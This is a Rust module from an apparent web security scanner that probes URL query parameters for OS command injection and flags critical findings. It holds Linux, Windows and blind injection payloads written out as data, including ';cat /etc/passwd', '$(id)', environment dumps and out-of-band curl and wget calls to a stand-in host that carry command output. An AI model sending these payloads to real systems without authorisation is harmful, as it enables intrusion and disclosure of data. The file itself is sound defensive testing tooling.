//! Command Injection detection — OS-specific, multi-language, WAF bypass, chained, second-order.

use grym_core::{
    AssetRef, Confidence, Evidence, Finding, ScopedClient, ScopedClientError, Severity,
    TechniqueTier,
};
use regex::Regex;
use url::Url;

const CMD_PARAMS: &[&str] = &[
    "cmd",
    "command",
    "exec",
    "run",
    "ping",
    "nslookup",
    "traceroute",
    "trace",
    "host",
    "whois",
    "dig",
    "file",
    "dir",
    "ls",
    "cat",
    "tail",
    "head",
    "more",
    "less",
    "query",
    "search",
    "find",
    "grep",
    "awk",
    "sed",
    "sort",
    "uniq",
    "wget",
    "curl",
    "netcat",
    "nc",
    "ssh",
    "telnet",
    "ftp",
    "smtp",
    "mail",
    "send",
    "receive",
    "download",
    "upload",
    "open",
    "system",
    "shell",
    "bash",
    "sh",
    "powershell",
    "pwsh",
    "cmd.exe",
    "process",
    "eval",
    "assert",
    "system",
    "popen",
    "passthru",
    "shell_exec",
    "exec",
    "proc_open",
];

const CMD_LINUX_PAYLOADS: &[(&str, &[&str])] = &[
    (
        "sleep",
        &[";sleep 3", "|sleep 3", "`sleep 3`", "$(sleep 3)"],
    ),
    ("ping", &[";ping -c 3 127.0.0.1", "|ping -c 3 127.0.0.1"]),
    (
        "echo",
        &[";echo GRYM_TEST", "|echo GRYM_TEST", "`echo GRYM_TEST`"],
    ),
    ("whoami", &[";whoami", "|whoami", "`whoami`", "$(whoami)"]),
    ("id", &[";id", "|id", "`id`", "$(id)"]),
    (
        "cat_passwd",
        &[
            ";cat /etc/passwd",
            "|cat /etc/passwd",
            "`cat /etc/passwd`",
            "$(cat /etc/passwd)",
        ],
    ),
    (
        "curl_oob",
        &[";curl http://oob.test/$(id)", "|curl http://oob.test/$(id)"],
    ),
    (
        "wget_oob",
        &[
            ";wget http://oob.test/$(whoami)",
            "|wget http://oob.test/$(whoami)",
        ],
    ),
    ("uname", &[";uname -a", "|uname -a", "`uname -a`"]),
    ("ls_root", &[";ls -la /", "|ls -la /", "`ls -la /`"]),
    (
        "php",
        &[";php -r 'echo GRYM_TEST;'", "|php -r 'echo GRYM_TEST;'"],
    ),
    (
        "python",
        &[";python -c 'import os; os.system(\"echo GRYM_TEST\")'"],
    ),
    ("perl", &[";perl -e 'system(\"echo GRYM_TEST\")'"]),
];

const CMD_WINDOWS_PAYLOADS: &[(&str, &[&str])] = &[
    ("timeout", &["&timeout 5", "|timeout 5"]),
    ("echo", &["&echo GRYM_TEST", "|echo GRYM_TEST"]),
    ("whoami", &["&whoami", "|whoami"]),
    ("systeminfo", &["&systeminfo", "|systeminfo"]),
    ("dir", &["&dir C:\\", "|dir C:\\"]),
    (
        "powershell",
        &["&powershell -Command \"Write-Host GRYM_TEST\""],
    ),
    (
        "type",
        &["&type C:\\windows\\win.ini", "|type C:\\windows\\win.ini"],
    ),
    ("ipconfig", &["&ipconfig /all", "|ipconfig /all"]),
    ("net user", &["&net user", "|net user"]),
];

const CMD_PAYLOADS_BLIND: &[(&str, &[&str])] = &[
    (
        "whoami_redirect",
        &[
            "; whoami > /tmp/GRYM && echo Done",
            "| whoami > /tmp/GRYM && echo Done",
        ],
    ),
    (
        "uname_file",
        &[
            "; uname -a > /tmp/GRYM && echo Done",
            "| uname -a > /tmp/GRYM && echo Done",
        ],
    ),
    ("env_file", &["; env > /tmp/GRYM && echo Done"]),
    (
        "id_file",
        &["; id 2>&1 > /tmp/GRYM", "| id 2>&1 > /tmp/GRYM"],
    ),
];

const CMD_ERROR_PATTERNS: &[&str] = &[
    r"(?i)command not found",
    r"(?i)sh:\s",
    r"(?i)bash:\s",
    r"(?i)system32",
    r"(?i)output.*of.*command",
    r"(?i)exec\(\)",
    r"(?i)shell_exec",
    r"(?i)system\(\)",
    r"(?i)popen\(\)",
    r"(?i)passthru\(\)",
    r"(?i)GRYM_TEST",
    r"(?i)uid=",
    r"(?i)root:",
    r"(?i)bin/bash",
    r"(?i)uid=[0-9]+",
    r"(?i)gid=[0-9]+",
    r"(?i)groups=",
    r"(?i)Not recognized as an internal",
    r"(?i)is not recognized",
    r"(?i)Disallowed command",
    r"(?i)Service not implemented",
    r"(?i)Command execution error",
];

pub async fn check_command_injection(
    client: &ScopedClient,
    url: &Url,
) -> Result<Vec<Finding>, ScopedClientError> {
    let mut findings = Vec::new();

    let base_query: Vec<(String, String)> = url
        .query_pairs()
        .map(|(k, v)| (k.into_owned(), v.into_owned()))
        .collect();

    if base_query.is_empty() {
        return Ok(findings);
    }

    for (param_name, _value) in &base_query {
        if !CMD_PARAMS.contains(&param_name.as_str()) {
            continue;
        }

        for payload_batch in [CMD_LINUX_PAYLOADS, CMD_WINDOWS_PAYLOADS].concat() {
            let (_, payloads) = payload_batch;
            for payload in payloads {
                let mut test_url = url.clone();
                {
                    let mut pairs = test_url.query_pairs_mut();
                    pairs.clear();
                    for (k, v) in &base_query {
                        let val = if k == param_name {
                            format!("{}{}", v, payload)
                        } else {
                            v.clone()
                        };
                        pairs.append_pair(k, &val);
                    }
                }

                if let Ok(response) = client
                    .get(
                        "grym-web-scanner",
                        test_url,
                        TechniqueTier::StandardDetection,
                    )
                    .await
                {
                    for pattern in CMD_ERROR_PATTERNS {
                        if let Ok(re) = Regex::new(pattern)
                            && re.is_match(&response.body)
                        {
                            let mut f = Finding::new(
                                format!("Command Injection detected in '{}' parameter", param_name),
                                AssetRef {
                                    identifier: url.to_string(),
                                    kind: "web".into(),
                                },
                                Severity::Critical,
                                Confidence::Confirmed,
                                "grym-web-scanner",
                            );
                            f.categories.push("A05:2025-Injection".into());
                            f.cwe_ids.push(78);
                            f.evidence.push(Evidence::redacted(
                                "cmd-injection",
                                format!("Payload triggered response: {}", payload),
                                response.body.chars().take(200).collect::<String>(),
                            ));
                            f.remediation = "Never pass user input to command interpreters. Use language-native APIs with proper input validation.".into();
                            f.references.push(
                                "https://owasp.org/www-community/attacks/Command_Injection".into(),
                            );
                            findings.push(f);
                            break;
                        }
                    }
                }
            }
        }
    }

    Ok(findings)
}
